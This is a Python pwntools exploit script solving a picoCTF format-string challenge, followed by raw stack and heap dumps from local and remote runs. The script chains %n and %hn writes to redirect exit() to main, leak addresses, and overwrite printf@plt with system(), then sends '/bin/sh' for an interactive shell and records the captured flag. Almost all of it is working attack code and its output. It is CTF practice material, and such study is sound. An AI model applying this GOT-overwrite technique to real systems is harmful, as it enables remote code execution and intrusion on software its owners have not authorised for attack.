from pwn import *

if not args.REMOTE:
	c = process('./vuln', aslr=False, env={})
else:
	c = remote('mercury.picoctf.net', 43206)

EXIT_PLT = 0x602068
MAIN_ADDR = 0x400b95

'''
STAGE 1
'''

log.info('On stage 1 (making program call main() instead of exit())')
c.recvuntil(b'portfolio')
c.sendline(b'1')

exp = b''
# Skip first 11 values
exp += b'%9x'*10
# Write enough characters
chars_to_write = EXIT_PLT - 9*10
exp += '%{}x'.format(chars_to_write).encode()
# Write to 12th value (stack address)
exp += b'%n'
# Continue reading values
exp += b'%20llx'*6
# Write enough characters to get 0x0b95 as lower bytes
chars_to_write = 59585+500
exp += '%{}x'.format(chars_to_write).encode()
# Write to 20th value (exit@plt), making program call main() instead of exit()
exp += b'%hn'

c.sendline(exp)
c.recvuntil(b'token:\n')

# Leak stack and heap addresses
res = c.recvuntil('\nPortfolio')
res = res[EXIT_PLT - 9*10:EXIT_PLT - 9*10 + 3000].split();
res = [int(x, 16) for x in res]
heap_addr = res[0]
stack_addr = res[2]

log.info('Leaked heap address: {}'.format(hex(heap_addr)))
log.info('Leaked stack address: {}'.format(hex(stack_addr)))
log.success('Stage 1 complete!')

'''
STAGE 2
'''

PRINTF_PLT = 0x602038
# SYSTEM_PLT = 0x602030
SYSTEM_PLT = 0x4006f6

log.info('On stage 2 (setting up extra pointer to printf@plt)')
c.recvuntil(b'portfolio')
c.sendline(b'1')

exp = b''
# Skip first 51 values
exp += b'%9x'*50
# Write enough characters
chars_to_write = PRINTF_PLT - 9*50 + 3
exp += '%{}x'.format(chars_to_write).encode()
# Write to 52nd value (stack address)
exp += b'%n'
# Continue reading values
exp += b'%20llx'*15

c.sendline(exp)
c.recvuntil(b'token:\n')
res = c.recvuntil('\nPortfolio', drop=True).split()
print(res)
log.success('Stage 2 complete!')

'''
STAGE 3
'''

log.info('On stage 3 (making program call system() instead of printf())')
c.recvuntil(b'portfolio')
c.sendline(b'1')

# Lower write
exp = b''
# Print memory
# for i in range(51, 76):
#	exp += '%{}$20llx'.format(i).encode()
# Skip first 27 values
exp += b'%9x'*26
# Write enough characters
chars_to_write = PRINTF_PLT - 9*26
exp += '%{}x'.format(chars_to_write).encode()
# Write to 28th value (stack address)
exp += b'%n'
# Continue reading values
exp += b'%9x'*6
# Write enough characters to get system() in lower 6 bytes
chars_to_write = SYSTEM_PLT + 0x1000000 - PRINTF_PLT - 9 * 6
exp += '%{}x'.format(chars_to_write).encode()
# Write to 35th value (printf@plt), making lower bits of program call system() instead of printf()
exp += b'%lln'

# Higher write
exp += b'%9x'*26
# Write enough characters to get 0x00 in lowest byte
chars_to_write = 32
exp += '%{}x'.format(chars_to_write).encode()
# Write to 64th value (printf@plt), making higher bits 0
exp += b'%hhn'
exp += b'%9x'*2
print(len(exp))

# gdb.attach(c)
c.sendline(exp)
for i in range(6):
	res = c.recvline().split()
	for j in range(len(res)):
		print(str(j+1) + ': ', res[j])

log.success('Stage 3 complete!')
c.info('Popping a shell... :D')

c.sendline(b'1')
c.sendline(b'/bin/sh')
c.interactive()

# picoCTF{explo1t_m1t1gashuns_d0295f63}

'''
data = []
for j in range(0, 240-80, 16):
	log.info('Getting data...')

	c.recvuntil(b'portfolio')
	c.sendline(b'1')

	exp = b''
	for i in range(1+j, 17+j):
		exp += '%{}$20llx'.format(i).encode()
	c.sendline(exp)

	c.recvuntil(b'token:\n')
	res = c.recvuntil('\nPortfolio')[:-10]
	print(res)
	res = res.decode().split()
	for k in res:
		data.append(int(k, 16))

print('Data:')
for i in range(len(data)):
	if i % 8 == 0: print()
	print('{:18s}'.format(hex(data[i])[2:]), end=' ')

c.interactive()
'''

'''
1:  b'7ff0854dc7e3'
2:  b'7ff0854dd8c0'
3:  b'7ff085200224'
4:  b'19'
5:  b'0'
6:  b'400e41'
7:  b'188b290'
8:  b'7ffdc6b54170'
9:  b'200000000'
10:  b'188b5f0'
11:  b'188b610'
12:  b'7ffdc6b541b0'
13:  b'400c66'
14:  b'7ff0854dc7e3'
15:  b'85170c42'
16:  b'7ffdc6b541b0'
17:  b'100000000'
18:  b'188b290'
19:  b'25fbc12c736b6a00'
20:  b'7ffdc6b541f0'
21:  b'400c9e'
22:  b'7ff0854dc7e3'
23:  b'85170c42'
24:  b'b'
25:  b'100000000'
26:  b'188b290'
27:  b'25fbc12c736b6a00'
28:  b'7ffdc6b54230'
29:  b'400c9e'
30:  b'7ffdc6b54318'
31:  b'100000000'
32:  b'400ca0'
33:  b'100400780'
34:  b'188a260'
35:  b'25fbc12c736b6a00'
36:  b'602068'
37:  b'7ff085111bf7'
38:  b'1'
39:  b'7ffdc6b54318'
40:  b'100008000'
41:  b'400b95'
42:  b'0'
43:  b'3068be424455e760'
44:  b'400780'
45:  b'7ffdc6b54310'
46:  b'0'
47:  b'0'
48:  b'cf9333a8d995e760'
49:  b'cf89b4e06a4be760'
50:  b'7ffd00000000'
1:  b'0'
2:  b'0'
3:  b'7fb2af06c8d3'
4:  b'7fb2af052638'
5:  b'580fc'
6:  b'0'
7:  b'0'
8:  b'0'
9:  b'400780'
10:  b'7ffdddd59ef0'
11:  b'4007aa'
12:  b'7ffdddd59ee8'
13:  b'1c'
14:  b'60203b'
15:  b'7ffdddd5be67'
16:  b'0'
17:  b'7ffdddd5bea6'
18:  b'7ffdddd5beb3'
19:  b'7ffdddd5bebc'
20:  b'7ffdddd5beeb'
21:  b'7ffdddd5bf29'
22:  b'7ffdddd5bf44'
23:  b'7ffdddd5bf65'
24:  b'7f

STAGE 2

Data (Remote):
7f42826c37e3       7f42826c48c0       7f42823e7224       19                 0                  400e41             1bfd2d0            7ffca56280e0       
200000000          1bfd2b0            1bfd4f0            7ffca5628120       400c66             7f42826c37e3       82357c42           b                  
100000000          8bd2d0             a7a58129b1bb00     7ffc183dc790       400c9e             7ffc183dc878       100000000          400ca0             
100400780          8bc260             a7a58129b1bb00     602068             7fc847dabbf7       1                  7ffc183dc878       100008000          
400b95             0                  f6a87ca87eee572d   400780             7ffe28687ce0       0                  0                  9542cf89f8e572d    
8453b53d0f0572d    7ffe00000000       0                  0                  7f76a3fbd8d3       7f76a3fa3638       567ba              0                  
0                  0                  400780             7ffdcb460cb0       4007aa             7ffdcb460ca8       1c                 1                  
7ffdcb461e67       0                  7ffdcb461ea6       7ffdcb461eb3       7ffdcb461ebc       7ffdcb461eeb       7ffdcb461f29       7ffdcb461f44       
7ffc5cb18f65       7ffc5cb18f6d       0                  21                 7ffc5cb75000       10                 1f8bfbff           6                  
1000               11                 64                 3                  400040             4                  38                 5                  
9                  7                  7ff6a9fc7000       8                  0                  9                  400780             b                  
5ad                c                  5ad                d                  5ae                e                  5ae                17              

Data (Local):
1555554fa723       0                  15555541f1e7       1a                 7fffffff           400e41             604350             400ca0             
400000000          6042d0             604570             7fffffffed30       400c66             1555554fa723       5539571a           400ca0             
1ffffed70          604350             baa603f4e1e96b00   7fffffffed70       400c9e             7fffffffee68       100400ca0          0                  
100400780          6032a0             baa603f4e1e96b00   602068             1555553350b3       155555553620       7fffffffee68       100000000          
400b95             400ca0             38820b6dfa43b98    400780             7fffffffee60       0                  0                  fc77df4904a43b98   
29228ad07f6a3b98   0                  0                  0                  1                  7fffffffee68       7fffffffee78       155555555190       
0                  0                  400780             7fffffffee60       0                  0                  4007aa             7fffffffee58       
1c                 1                  7fffffffefea       0                  0                  21                 155555524000       10                 
1f8bfbff           6                  1000               11                 64                 3                  400040             4                  
38                 5                  9                  7                  155555526000       8                  0                  9                  
400780             b                  3e8                c                  3e8                d                  3e8                e                  
3e8                17                 0                  19                 7fffffffefc9       1a                 0                  1f               

break *0x400ace
printf starts at x/20gx 0x7fffffffec08
ret at 0x7fffffffecf8

------------------------------------------------------------------------------------------------------------------------------------------------------

STAGE 1

Data (Remote):
7efe159a77e3       7efe159a88c0       7efe156cb224       19                 0                  400e41             1f79260            b                  
300000000          1f7a2b0            1f7a2d0            7ffcc7b835b0       400c66             7ffcc7b83698       100000000          400ca0             
100400780          241b260            eb8ff031ec0ec300   400ca0             7f5b6d7bdbf7       1                  7ffd86cd6048       100008000          
400b95             0                  4e53ec4448f90092   400780             7ffd86cd6040       0                  0                  ce5aa9831ecdf17a   
cee0e8ff4993f17a   7ffd00000000       0                  0                  7fa0c52718d3       7fa0c5257638       542e0              0                  
0                  0                  400780             7ffde45730d0       4007aa             7ffe00e501c8       1c                 1                  
7ffe00e50e67       0                  7ffe00e50ea6       7ffe00e50eb3       7ffe00e50ebc       7ffe00e50eeb       7ffe00e50f29       7ffe00e50f44       
7ffe00e50f65       7ffe00e50f6d       0                  21                 7ffe10db1000       10                 1f8bfbff           6                  
1000               11                 64                 3                  400040             4                  38                 5                  
9                  7                  7f2929e3b000       8                  0                  9                  400780             b                  
5ad                c                  5ad                d                  5ae                e                  5ae                17                 
0                  19                 7fff969ffb99       1a                 0                  1f                 7fff96a00fb9       f                  
7fff969ffba9       0                  0                  0                  5a8c0d959c47c300   e1474624f4a73f5    34365f36387804     0             

Data (Local):
1555554fa723       0                  15555541f1e7       1a                 7fffffff           400e41             6032a0             400ca0             
400000000          604370             604390             7fffffffed70       400c66             7fffffffee68       100400ca0          0                  
100400780          6032a0             12de006d7fa1b800   0                  1555553350b3       155555553620       7fffffffee68       100000000          
400b95             400ca0             bc19b2e5cdc09d11   400780             7fffffffee60       0                  0                  2fe0726d7aa30c73   
fab527f4016d0c73   0                  0                  0                  1                  7fffffffee68       7fffffffee78       155555555190       
0                  0                  400780             7fffffffee60       0                  0                  4007aa             7fffffffee58       
1c                 1                  7fffffffefea       0                  0                  21                 155555524000       10                 
1f8bfbff           6                  1000               11                 64                 3                  400040             4                  
38                 5                  9                  7                  155555526000       8                  0                  9                  
400780             b                  3e8                c                  3e8                d                  3e8                e                  
3e8                17                 0                  19                 7fffffffefc9       1a                 0                  1f                 
7fffffffeff1       f

break *0x400ace
printf starts at x/20gx 0x7fffffffec48
'''